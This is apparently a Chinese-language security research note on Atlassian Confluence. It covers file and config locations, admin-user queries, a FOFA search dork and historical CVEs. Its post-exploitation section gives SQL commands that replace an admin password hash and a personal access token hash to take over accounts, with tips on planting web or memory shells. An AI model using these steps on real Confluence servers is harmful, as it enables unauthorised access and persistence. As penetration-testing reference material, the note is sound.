# Atlassian Confluence
# 0x01 基本知识
Confluence是一个专业的企业知识管理与协同软件，也可以用于构建企业wiki（多人协作的写作系统）。使用简单，但它强大的编辑和站点管理特征能够帮助团队成员之间共享信息、文档协作、集体讨论，信息推送。

## 1.1 文件目录

![image](https://user-images.githubusercontent.com/84888757/172709537-8aa6c309-e515-4586-a8d5-16147fbc8b6c.png)

(1) `<confluence-installation> `
  
安装目录，用于存储系统文件

默认安装位置：
```
Windows: C:/Program Files/Atlassian/Confluence/
Linux: /opt/atlassian/confluence/
```

(2) `<confluence-home>`

数据目录，用于存储数据

默认安装位置：

```
Windows: C:/Program Files/Atlassian/Application Data/Confluence/
Linux: /var/atlassian/application-data/confluence/
```

二者之间的联系：

`<confluence-installation>/confluence/WEB-INF/classes/confluence-init.properties` 文件中定义了`<confluence-home>`的位置

## 1.2 数据库信息

存储数据库配置信息的位置：`<confluence-home>/confluence.cfg.xml`

```
# Windows 默认路径
C:\Program Files\Atlassian\Application Data\Confluence\confluence.cfg.xml
# Ubuntu 默认路径
/var/atlassian/application-data/confluence/confluence.cfg.xml
```

![image](https://user-images.githubusercontent.com/84888757/172693620-4fcddc65-beb1-4a54-9c19-12e7b0655b0e.png)


## 1.3 用户信息

用户信息位于Confluence的数据库中

存储用户信息的表：`CWD_USER`，具体列名称如下：

```
user_name:用户名

active:是否启用

email_address:邮件地址

credential:用户凭据

directory_id:用户组，代表用户的权限

# directory_id 对应的具体用户组名称可通过以下方式查看：

查询表cwd_group中的group_name列，管理员用户组的值为`confluence-administrators`

查询表cwd_directory中的directory_name列，管理员用户组的值为`Confluence Internal Directory`

```

🚩 SQL命令在postgres数据库中执行，相关命令如下：
```
bash-5.1# psql -U postgres

# 查看数据库：
postgres=# \l
```

![image](https://user-images.githubusercontent.com/84888757/172711110-db4abd1b-8670-42ee-9cf2-4ad990173e42.png)

```
# 进入数据库：
postgres=# \c confluence
```

![image](https://user-images.githubusercontent.com/84888757/172711130-942e4f29-f2d5-4d42-87b7-bc5a1c4db98f.png)

直接筛选出管理员用户的SQL命令：

```
confluence=# select u.id,u.user_name,u.active,u.credential from cwd_user u  join cwd_membership m on u.id=m.child_user_id join cwd_group g on m.parent_id=g.id join cwd_directory d on d.id=g.directory_id where g.group_name = 'confluence-administrators' and d.directory_name='Confluence Internal Directory';
```

![image](https://user-images.githubusercontent.com/84888757/172711282-d9b98589-ecef-4333-8ed3-bc37d915d536.png)


## 1.4 日志文件位置

`<confluence-home>/logs/`

## 1.5 Web路径

`<confluence-installation>/confluence/`

Windows: Confluence默认权限为network service，具有写权限

Linux：Confluence默认权限为confluence，没有写权限


# 0x02 FOFA dork
  
> app="ATLASSIAN-Confluence"

# 0x03 Confluence 历史漏洞
- [Confluence路径穿越与命令执行漏洞（CVE-2019-3396）](https://github.com/reidmu/sec-note/blob/main/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Atlassian%20Confluence/Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2019-3396).md)

- OGNL表达式注入代码执行漏洞（CVE-2021-26084）

- Atlassian Confluence 远程代码执行（CVE-2022-26134）

# 0x04 Confluence 后利用思路

来自[3gstudent](https://www.4hou.com/posts/n6Z7)

## 4.1 修改数据库，实现用户登录
  
### 4.1.1 修改用户登录口令

登录url:`http://192.168.x.x:8090/login.action`

  - 🌰：查看用户关键信息，命令如下：
    `confluence=# select id,user_name,credential from cwd_user;`

    - ![image](https://user-images.githubusercontent.com/84888757/172711962-ba0a8150-e598-41cd-8471-95b0c46c457c.png)


  - 🌰：修改用户admin的口令信息，命令如下：
    `confluence=# UPDATE cwd_user SET credential= '{PKCS5S2}UokaJs5wj02LBUJABpGmkxvCX0q+IbTdaUfxy1M9tVOeI38j95MRrVxWjNCu6gsm' WHERE id = 425985;`

    - ![image](https://user-images.githubusercontent.com/84888757/172711892-d51aeeda-6515-49c7-9aac-ff99db74970e.png)


    - 🚩 注：`{PKCS5S2}UokaJs5wj02LBUJABpGmkxvCX0q+IbTdaUfxy1M9tVOeI38j95MRrVxWjNCu6gsm` 对应的明文为 `123456`
  
### 4.1.2 修改Personal Access Tokens
  - 使用Personal Access Tokens可以实现免密登录
  - 🌰：测试环境下，Personal Access Tokens对应表为AO_81F455_PERSONAL_TOKEN
  - 查询语句：`confluence=# select * from "AO_81F455_PERSONAL_TOKEN";`
  - 修改Personal Access Tokens，命令如下：`confluence=# UPDATE "AO_81F455_PERSONAL_TOKEN" SET "HASHED_TOKEN"= '{PKCS5S2}Deoq/psifhVO0VE8qhJ6prfgOltOdJkeRH4cIxac9NtoXVodRQJciR95GW37gR7/' WHERE "ID" = 4;`

    - 🚩 注：`{PKCS5S2}Deoq/psifhVO0VE8qhJ6prfgOltOdJkeRH4cIxac9NtoXVodRQJciR95GW37gR7/` 对应的token为 `MjE0NTg4NjQ3MTk2OrQ5JtSJgT/rrRBmCY4zu+N+NaWZ`


## 4.2 写文件
- Windows: Confluence默认权限为network service，具有写权限
- Linux： Confluence默认权限为confluence，没有写权限，可以尝试内存马
- Web路径：< confluence-installation>/confluence/


# 0x05 参考链接
- https://www.4hou.com/posts/n6Z7
